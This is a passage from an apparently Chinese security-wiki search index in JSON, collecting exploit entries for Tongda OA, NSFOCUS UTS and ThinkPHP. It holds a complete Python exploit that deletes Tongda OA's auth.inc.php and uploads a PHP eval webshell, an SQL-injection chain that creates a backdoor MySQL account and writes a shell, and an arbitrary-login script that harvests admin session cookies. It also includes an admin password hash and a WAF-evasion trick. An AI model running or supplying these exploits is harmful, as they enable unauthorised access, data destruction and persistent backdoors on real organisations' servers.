AF%E5%A2%83%E5%BA%93/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/","text":"Thinkphp 5.x\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u73af\u5883 \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-02 23:43:59 \u5b89\u88c5docker\u73af\u5883 \u00b6 \u4e0b\u8f7dvulhub\u9879\u76ee \u00b6 \u9879\u76ee\u5730\u5740\uff1ahttps://github.com/vulhub/vulhub \u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/5-rce\u76ee\u5f55\uff1a cd vunhub-master/thinkphp/5-rce \u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose up -d \u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668 ip:8080 \u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01 \u00b6","title":"Thinkphp 5.x\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u73af\u5883"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#thinkphp-5x","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-02 23:43:59","title":"Thinkphp 5.x\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u73af\u5883"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#docker","text":"","title":"\u5b89\u88c5docker\u73af\u5883"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#vulhub","text":"\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/vulhub/vulhub \u4e0b\u8f7d\u540e\u8fdb\u5165\u9879\u76ee\u76ee\u5f55\u4e0bthinkphp/5-rce\u76ee\u5f55\uff1a cd vunhub-master/thinkphp/5-rce \u5f00\u542f\u672c\u6b21\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose up -d \u6d4f\u89c8\u5668\u8bbf\u95ee\u73af\u5883\u670d\u52a1\u5668 ip:8080","title":"\u4e0b\u8f7dvulhub\u9879\u76ee"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/#_1","text":"","title":"\u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/%E7%99%BD%E9%98%81%E7%8E%AF%E5%A2%83%E5%BA%93%E4%BB%8B%E7%BB%8D/","text":"\u767d\u9601\u73af\u5883\u5e93\u4ecb\u7ecd \u00b6 \u7b49\u5f85\u4ee5\u4e3a\u5927\u4f6c\u6765\u5199\u767d\u9601\u73af\u5883\u5e93\u4ecb\u7ecd\u3002\u3002\u3002\u5c31\u6b63\u5728\u770b\u7684\u4f60\uff0c\u6765\u5427\u3002","title":"\u767d\u9601\u73af\u5883\u5e93\u4ecb\u7ecd"},{"location":"%E7%99%BD%E9%98%81-%E7%8E%AF%E5%A2%83%E5%BA%93/%E7%99%BD%E9%98%81%E7%8E%AF%E5%A2%83%E5%BA%93%E4%BB%8B%E7%BB%8D/#_1","text":"\u7b49\u5f85\u4ee5\u4e3a\u5927\u4f6c\u6765\u5199\u767d\u9601\u73af\u5883\u5e93\u4ecb\u7ecd\u3002\u3002\u3002\u5c31\u6b63\u5728\u770b\u7684\u4f60\uff0c\u6765\u5427\u3002","title":"\u767d\u9601\u73af\u5883\u5e93\u4ecb\u7ecd"},{"location":"%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u7eff\u76df\u5168\u6d41\u91cf\u5a01\u80c1\u5206\u6790\u89e3\u51b3\u65b9\u6848\u9488\u5bf9\u539f\u59cb\u6d41\u91cf\u8fdb\u884c\u91c7\u96c6\u548c\u76d1\u63a7\uff0c\u5bf9\u6d41\u91cf\u4fe1\u606f\u8fdb\u884c\u6df1\u5ea6\u8fd8\u539f\u3001\u5b58\u50a8\u3001\u67e5\u8be2\u548c\u5206\u6790\uff0c\u53ef\u4ee5\u53ca\u65f6\u638c\u63e1\u91cd\u8981\u4fe1\u606f\u7cfb\u7edf\u76f8\u5173\u7f51\u7edc\u5b89\u5168\u5a01\u80c1\u98ce\u9669\uff0c\u53ca\u65f6\u68c0\u6d4b\u6f0f\u6d1e\u3001\u75c5\u6bd2\u6728\u9a6c\u3001\u7f51\u7edc\u653b\u51fb\u60c5\u51b5\uff0c\u53ca\u65f6\u53d1\u73b0\u7f51\u7edc\u5b89\u5168\u4e8b\u4ef6\u7ebf\u7d22\uff0c\u53ca\u65f6\u901a\u62a5\u9884\u8b66\u91cd\u5927\u7f51\u7edc\u5b89\u5168\u5a01\u80c1\uff0c\u8c03\u67e5\u3001\u9632\u8303\u548c\u6253\u51fb\u7f51\u7edc\u653b\u51fb\u7b49\u6076\u610f\u884c\u4e3a\uff0c\u4fdd\u969c\u91cd\u8981\u4fe1\u606f\u7cfb\u7edf\u7684\u7f51\u7edc\u5b89\u5168\u3002 \u7eff\u76df\u7efc\u5408\u5a01\u80c1\u63a2\u9488\u8bbe\u5907\u7248\u672cV2.0R00F02SP02\u53ca\u4e4b\u524d\u5b58\u5728\u6b64\u6f0f\u6d1e\u3002 \u5904\u7f6e\u610f\u89c1: \u5efa\u8bae\u5c3d\u5feb\u66f4\u65b0\u8865\u4e01\u81f3\u6700\u65b0\uff1a http://update.nsfocus.com/update/listBsaUtsDetail/v/F02 \u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\uff1a \u5bf9\u54cd\u5e94\u5305\u8fdb\u884c\u4fee\u6539\uff0c\u5c06false\u66f4\u6539\u4e3atrue\u7684\u65f6\u5019\u53ef\u4ee5\u6cc4\u9732\u7ba1\u7406\u7528\u6237\u7684md5\u503c\u5bc6\u7801 \u5229\u7528\u6e20\u9053\u7684md5\u503c\u53bb\u767b\u5f55\u9875\u9762 7ac301836522b54afcbbed714534c7fb \u6210\u529f\u767b\u5f55\uff0c\u767b\u5f55\u540e\u901a\u8fc7\u7ba1\u7406\u5458\u6743\u9650\u5bf9\u8bbe\u5907\u8fdb\u884c\u7ba1\u63a7\uff0c\u5e76\u4e14\u53ef\u4ee5\u770b\u5230\u5927\u91cf\u7684\u653b\u51fb\u4fe1\u606f\uff0c\u6cc4\u9732\u5185\u90e8\u7f51\u7edc\u5730\u5740\u5305\u62ec\u8d44\u4ea7\u7ba1\u7406\u3002","title":"\u7eff\u76dfUTS\u7efc\u5408\u5a01\u80c1\u63a2\u9488\u7ba1\u7406\u5458\u4efb\u610f\u767b\u5f55"},{"location":"%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9FWAF%E7%BB%95%E8%BF%87/","text":"XFF\u4f2a\u9020\u5b57\u6bb5\u5730\u5740\u4e3a127.0.0.1\uff0c\u5bfc\u81f4waf\u4e0a\u770b\u4e0d\u2ec5\u653b\u51fb\u8005\u5730\u5740","title":"\u7eff\u76dfWAF\u7ed5\u8fc7"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 \u901a\u8fbeOA V11.6 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 EXP\uff1a \u00b6 import requests target=\"http://********/\" payload=\"<?php eval($_POST['shell']);?>\" print(\"[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA\") input(\"Press enter to continue\") print(\"[*]Deleting auth.inc.php....\") url=target+\"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" requests.get(url=url) print(\"[*]Checking if file deleted...\") url=target+\"/inc/auth.inc.php\" page=requests.get(url=url).text if 'No input file specified.' not in page: print(\"[-]Failed to deleted auth.inc.php\") exit(-1) print(\"[+]Successfully deleted auth.inc.php!\") print(\"[*]Uploading payload...\") url=target+\"/general/data_center/utils/upload.php?action=upload&filetype=tql&repkid=/.<>./.<>./.<>./\" files = {'FILE1': ('shell.php', payload)} requests.post(url=url,files=files) url=target+\"/_shell.php\" page=requests.get(url=url).text if 'No input file specified.' not in page: print(\"[+]Filed Uploaded Successfully\") print(\"[+]URL:\",url) else: print(\"[-]Failed to upload file\") 1.\u4fdd\u5b58\u4e0a\u8ff0exp\u4e3a.py\u811a\u672c\u6587\u4ef6 2.\u66ff\u6362exp\u4e2d\u7684target\u4e3a\u76ee\u6807url 3.\u6267\u884c\u811a\u672c\u540e\u83dc\u5200\u8fde\u63a5\u8f93\u51fa\u7684URL: ********** \u5373\u53ef\uff0c\u5bc6\u7801\u4e3ashell","title":"\u901a\u8fbeOA 11.6\u6587\u4ef6\u5220\u9664+\u6587\u4ef6\u4e0a\u4f20getshell"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_1","text":"\u901a\u8fbeOA V11.6","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_2","text":"","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#exp","text":"import requests target=\"http://********/\" payload=\"<?php eval($_POST['shell']);?>\" print(\"[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA\") input(\"Press enter to continue\") print(\"[*]Deleting auth.inc.php....\") url=target+\"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" requests.get(url=url) print(\"[*]Checking if file deleted...\") url=target+\"/inc/auth.inc.php\" page=requests.get(url=url).text if 'No input file specified.' not in page: print(\"[-]Failed to deleted auth.inc.php\") exit(-1) print(\"[+]Successfully deleted auth.inc.php!\") print(\"[*]Uploading payload...\") url=target+\"/general/data_center/utils/upload.php?action=upload&filetype=tql&repkid=/.<>./.<>./.<>./\" files = {'FILE1': ('shell.php', payload)} requests.post(url=url,files=files) url=target+\"/_shell.php\" page=requests.get(url=url).text if 'No input file specified.' not in page: print(\"[+]Filed Uploaded Successfully\") print(\"[+]URL:\",url) else: print(\"[-]Failed to upload file\") 1.\u4fdd\u5b58\u4e0a\u8ff0exp\u4e3a.py\u811a\u672c\u6587\u4ef6 2.\u66ff\u6362exp\u4e2d\u7684target\u4e3a\u76ee\u6807url 3.\u6267\u884c\u811a\u672c\u540e\u83dc\u5200\u8fde\u63a5\u8f93\u51fa\u7684URL: ********** \u5373\u53ef\uff0c\u5bc6\u7801\u4e3ashell","title":"EXP\uff1a"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.7%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/","text":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c \u00b6 \u901a\u8fbeoa 11.7 \u5229\u7528\u6761\u4ef6:\u9700\u8981\u8d26\u53f7\u767b\u5f55 POC \u00b6 1\u3001\u4e0b\u8f7d\u901a\u8fbeOA 11.7\uff0chttps://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe 2\u3001condition_cascade\u53c2\u6570\u5b58\u5728\u5e03\u5c14\u76f2\u6ce8 3.\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u51fd\u6570(sleep\u3001\u62a5\u9519\u7684\u51fd\u6570\u7b49\u7b49)\uff0c\u5404\u79cd\u6ce8\u91ca\uff0c\u4f7f\u7528payload\uff1aselect if((1=1),1,power(9999,99))\u3001select if((1=2),1,power(9999,99))\uff0c\u5224\u65ad\u6ce8\u5165\u70b9 #\u5f53\u5b57\u7b26\u76f8\u7b49\u65f6\uff0c\u4e0d\u62a5\u9519\uff0c\u9519\u8bef\u65f6\u62a5\u9519 4\u3001\u901a\u8fc7\u6dfb\u52a0\u7528\u6237at666\uff0c\u5bc6\u7801\u4e3aabcABC@123 5\u3001\u4f7f\u7528Navicat Premium\u8fde\u63a5\u6570\u636e\u5e93 6\u3001\u6dfb\u52a0\u7684\u8d26\u6237\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u65e5\u5fd7\u6162\u67e5\u8be2\u5199\u5165\u6587\u4ef6\uff0c\u9700\u8981\u7ed9\u521b\u5efa\u7684\u8d26\u6237\u6dfb\u52a0\u6743\u9650 \u63d0\u6743 7\u3001\u7136\u540e\u7528\u6ce8\u5165\u70b9\u5237\u65b0\u6743\u9650\uff0c\u56e0\u4e3a\u8be5\u7528\u6237\u662f\u6ca1\u6709\u5237\u65b0\u6743\u9650\u7684\u6743\u9650\u7684 general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges; 8\u3001\u518d\u6b21\u767b\u5f55\uff0c\u63d0\u793a\u5bc6\u7801\u8fc7\u671f\uff0c\u9700\u8981\u91cd\u65b0\u6267\u884cgrant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION 9\u3001\u7136\u540e\u5199shell \u65b9\u6cd5\u4e00: \u65b9\u6cd5\u4e8c: 10\u3001\u83dc\u5200\u8fde\u63a5","title":"\u901a\u8fbeOA 11.7\u5b58\u5728sql\u6ce8\u5165"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.7%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/#_1","text":"\u901a\u8fbeoa 11.7 \u5229\u7528\u6761\u4ef6:\u9700\u8981\u8d26\u53f7\u767b\u5f55","title":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.7%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/#poc","text":"1\u3001\u4e0b\u8f7d\u901a\u8fbeOA 11.7\uff0chttps://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe 2\u3001condition_cascade\u53c2\u6570\u5b58\u5728\u5e03\u5c14\u76f2\u6ce8 3.\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u51fd\u6570(sleep\u3001\u62a5\u9519\u7684\u51fd\u6570\u7b49\u7b49)\uff0c\u5404\u79cd\u6ce8\u91ca\uff0c\u4f7f\u7528payload\uff1aselect if((1=1),1,power(9999,99))\u3001select if((1=2),1,power(9999,99))\uff0c\u5224\u65ad\u6ce8\u5165\u70b9 #\u5f53\u5b57\u7b26\u76f8\u7b49\u65f6\uff0c\u4e0d\u62a5\u9519\uff0c\u9519\u8bef\u65f6\u62a5\u9519 4\u3001\u901a\u8fc7\u6dfb\u52a0\u7528\u6237at666\uff0c\u5bc6\u7801\u4e3aabcABC@123 5\u3001\u4f7f\u7528Navicat Premium\u8fde\u63a5\u6570\u636e\u5e93 6\u3001\u6dfb\u52a0\u7684\u8d26\u6237\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u65e5\u5fd7\u6162\u67e5\u8be2\u5199\u5165\u6587\u4ef6\uff0c\u9700\u8981\u7ed9\u521b\u5efa\u7684\u8d26\u6237\u6dfb\u52a0\u6743\u9650 \u63d0\u6743 7\u3001\u7136\u540e\u7528\u6ce8\u5165\u70b9\u5237\u65b0\u6743\u9650\uff0c\u56e0\u4e3a\u8be5\u7528\u6237\u662f\u6ca1\u6709\u5237\u65b0\u6743\u9650\u7684\u6743\u9650\u7684 general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges; 8\u3001\u518d\u6b21\u767b\u5f55\uff0c\u63d0\u793a\u5bc6\u7801\u8fc7\u671f\uff0c\u9700\u8981\u91cd\u65b0\u6267\u884cgrant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION 9\u3001\u7136\u540e\u5199shell \u65b9\u6cd5\u4e00: \u65b9\u6cd5\u4e8c: 10\u3001\u83dc\u5200\u8fde\u63a5","title":"POC"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u901a\u8fbeOA2017\u3001V11.X<V11.5 \u6f0f\u6d1e\u9a8c\u8bc1POC \u00b6 ''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\", \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers={} def getV11Session(url): checkUrl = url+'/general/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = str(res.text).split('{') codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '') getSessUrl = url+'/logincheck_code.php' res = requests.post( getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available.text: if '\u91cd\u65b0\u767b\u5f55' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') except: print('[-]Something Wrong With '+url) def get2017Session(url): checkUrl = url+'/ispirit/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = json.loads(res.text) codeUid = resText['codeuid'] codeScanUrl = url+'/general/login_code_scan.php' res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int( 1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers) resText = json.loads(res.text) status = resText['status'] if status == str(1): getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid res = requests.get(getCodeUidUrl) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available.text: if '\u91cd\u65b0\u767b\u5f55' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') else: print('[-]Something Wrong With '+url + ' Maybe Not Vulnerable ?') except: print('[-]Something Wrong With '+url) if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument( \"-v\", \"--tdoaversion\", type=int, choices=[11, 2017], help=\"Target TongDa OA Version. e.g: -v 11\u3001-v 2017\") parser.add_argument( \"-url\", \"--targeturl\", type=str, help=\"Target URL. e.g: -url 192.168.2.1\u3001-url http://192.168.2.1\" ) args = parser.parse_args() url = args.targeturl if 'http://' not in url: url = 'http://' + url if args.tdoaversion == 11: getV11Session(url) elif args.tdoaversion == 2017: get2017Session(url) else: parser.print_help() python3 poc.py -v \u7248\u672c -url url \u8fd0\u884c\u5e76\u83b7\u53d6\u5230\u53ef\u7528\u7684SESSIONID \u66ff\u6362\u6d4f\u89c8\u5668Cookie\u4e2d\u7684SESSIONID\u5373\u53ef\u5b9e\u73b0\u767b\u5f55\u4e3aadmin","title":"\u901a\u8fbeOA2017\u524d\u53f0\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#_1","text":"\u901a\u8fbeOA2017\u3001V11.X<V11.5","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#poc","text":"''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", 